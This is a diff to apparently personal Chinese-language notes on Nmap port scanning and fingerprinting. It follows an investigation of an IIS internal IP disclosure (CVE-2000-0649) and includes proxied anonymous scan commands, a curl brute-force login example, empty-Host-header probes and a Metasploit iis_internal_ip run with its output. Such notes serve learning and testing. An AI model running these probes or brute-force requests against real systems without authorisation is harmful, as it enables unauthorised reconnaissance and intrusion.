@@ -7,6 +7,8 @@ https://github.com/The-Art-of-Hacking/h4cker
 https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml
 nmap top 1000 包括哪些端口
 https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Infrastructure/nmap-ports-top1000.txt
+
 Nmap流量特征修改
 https://www.freebuf.com/articles/others-articles/250028.html
 
@@ -73,9 +75,111 @@ unfiltered（未被过滤的）当端口对 Nmap 的探测做出响应，但是 
 --min_rtt_timeout    设置 nmap 对每次探测至少等待你指定的时间，以毫秒为单位。    
 -M count    置进行 TCP connect() 扫描时，最多使用多少个套接字进行并行的扫描。
 
+[从 Masscan, Zmap 源码分析到开发实践](https://paper.seebug.org/1052/)
 
-从 Masscan, Zmap 源码分析到开发实践
-https://paper.seebug.org/1052/
+## TIPS
+### nmap 如何探测一个服务的指纹
+
+发某个机器的探测
+
+nmap -T4 -A -Pn -vvv xx.ip -p 80
+
+返回：
+
+```
+GetRequest
+X-Powered-By: ASP.NET
+<h2>Object moved to <a href="http://一个转接的内网ip/op/generate.aspx">here</a>.</h2>
+```
+
+发现返回很详细，但直接 `curl -vvv "xx.ip"` 并没有发现找到这些内网ip
+
+Q：是什么请求暴漏了这个服务的内网ip
+
+标准说法是：[Internal IP Address Disclosure ](https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed)
+
+https://serverfault.com/questions/931281/how-to-prevent-nmap-from-fingerprinting-haproxy
+ Nmap identifies HAProxy based on what versions added which headers to the response. 
+ The match lines are in the nmap-service-probes file in the Nmap source. 
+ Here are some selected comments from the file to illustrate how this was accomplished:
+
+https://github.com/nmap/nmap/blob/master/CHANGELOG
+IIS 相关
+
+https://resources.infosecinstitute.com/topic/nmap-cheat-sheet-part-4/
+绕过防火墙
+
+试试把nmap加到burpsuite看下发的payload是什么
+https://nmap.org/book/ncat-man-proxy-options.html
+
+```bash
+跑不通
+nmap -T4 -A -Pn -v xxx -p 80 --proxy socks5://127.0.0.1:2080
+跑通，但不能返回有问题的结果
+nmap -T4 -A -Pn -v xxx -p 80 --proxy socks4://127.0.0.1:2080
+nmap -T4 -A -Pn -v xxx -p 80 --proxy http://127.0.0.1:2080
+```
+
+https://security.stackexchange.com/questions/120708/nmap-through-proxy/120723#120723
+
+https://stackoom.com/question/3dO4f/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Openvas-proxychains%E6%88%96Nmap-proxychains-%E9%80%9A%E8%BF%87socks-%E8%80%8C%E9%9D%9Esocks
+
+如何使用Openvas + proxychains或Nmap + proxychains（通过socks5而非socks4）？
+https://www.shellhacks.com/anonymous-port-scanning-nmap-tor-proxychains/#comments
 
 
+Asp.net安全架构之4：Brute force（爆破）
+https://www.cnblogs.com/luminji/archive/2012/06/13/2531052.html
 
+curl "http://xxx/sso/ValidateUser.aspx " -vvv -X POST -d "loginId=luminji&password=123456"
+
+
+但这好像有解决之法
+https://serverfault.com/questions/122791/iis-reveals-internal-ip-address-in-content-location-field
+
+SERVER RESPONSE: 302 Object moved RSS
+https://forums.iis.net/t/1153986.aspx
+
+” For example, if you configure an HTTP redirect that results in an HTTP 302 response being sent, and your redirect code uses the server’s IP address, then the IP address may appear in the Content-Location or Location header of the response.  To work around this issue, do not use the server’s IP address in the redirect logic; instead, use its host name or fully qualified machine name.  A similar type of behavior can occur if you configure custom error pages to perform a redirect, and you use the IIS Manager to set the redirect target as a URL instead of a File.  In this scenario, specifying the File instead of URL will keep the IP address hidden.”( by  Mike Laing)
+
+You should check your pages’ code to see if it performs redirection with the site’s private IP. Also please note the IIS forum doesn’t cover questions about SMTP.
+
+这应该是漏洞正主：
+A: 不是，没有发现空Host的问题
+
+https://github.com/curl/curl/issues/2357
+curl -v -H 'Host:' -H 'Host;'  http://xxx
+
+server is revealed if an HTTP Request that does not have a Host header or has a NULL Host header is sent to the server
+
+https://support.microsoft.com/en-us/topic/fix-the-internal-ip-address-of-an-iis-7-0-server-is-revealed-if-an-http-request-that-does-not-have-a-host-header-or-has-a-null-host-header-is-sent-to-the-server-c493e9bc-dfd3-0d9b-941c-b2d93a957d9e
+
+这是这个漏洞重现的方法：
+https://support.kemptechnologies.com/hc/en-us/articles/203522429-How-to-Mitigate-Against-Internal-IP-Address-Domain-Name-Disclosure-In-Real-Server-Redirects
+kemptech@LC-161:~$ curl http://www.domain.com -v -l --http1.0 --Header 'Host: '
+
+但在本例中，如果这么发，SLB 会直接拒绝 < Via: HTTP/1.0 SLB.24
+
+参考：
+
+https://portswigger.net/web-security/host-header/exploiting#top
+How to identify and exploit HTTP Host header vulnerabilities
+如何识别和利用HTTP主机报头漏洞
+
+这个才是正主
+CVE-2000-0649
+
+https://www.securityfocus.com/bid/1499
+到 2009 年才修复
+https://www.cvedetails.com/cve/CVE-2000-0649/
+
+通过metasploit可以复现：
+
+msf > use auxiliary/scanner/http/iis_internal_ip
+msf6 auxiliary(scanner/http/iis_internal_ip) > set RHOST x.x.x.x
+msf6 auxiliary(scanner/http/iis_internal_ip) > exploit
+[+] Location Header: http://10.12.154.202/op/generate.aspx
+[+] Result for x.x.x.x found Internal IP:  10.12.x.x
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/iis_internal_ip) > info
